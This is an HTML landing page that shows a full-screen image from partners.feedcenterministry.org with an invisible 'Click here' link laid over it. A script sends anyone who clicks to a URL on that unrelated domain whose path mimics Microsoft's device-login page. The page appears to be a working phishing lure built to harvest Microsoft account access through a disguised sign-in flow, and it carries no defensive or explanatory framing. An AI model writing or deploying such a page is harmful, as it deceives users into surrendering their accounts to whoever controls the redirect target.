<!DOCTYPE html>
<html>
<head>
  <title>Landing Page</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-image: url('https://partners.feedcenterministry.org/static/buildingdreams.png');
      background-size: cover;
      background-position: center;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-end; /* Align items to the bottom */
    }
    .link-overlay {
      position: absolute;
      bottom: 0.5in; /* Adjust the distance from the bottom */
      left: calc(50% + 2in); /* Adjust the distance from the left (increased to 2 inches) */
      transform: translate(-50%, 0);
      font-size: 30px; /* Adjust the font size */
      color: transparent; /* Make the text transparent */
    }
  </style>
</head>
<body>
  <a href="#" class="link-overlay" id="link">Click here</a>

  <script>
    document.getElementById('link').addEventListener('click', function(event) {
      event.preventDefault(); // Prevent the default link behavior
      // Redirect to the specified URL
      window.location.href = 'https://partners.feedcenterministry.org/https://microsoft.com/devicelogin';
    });
  </script>
</body>
</html>
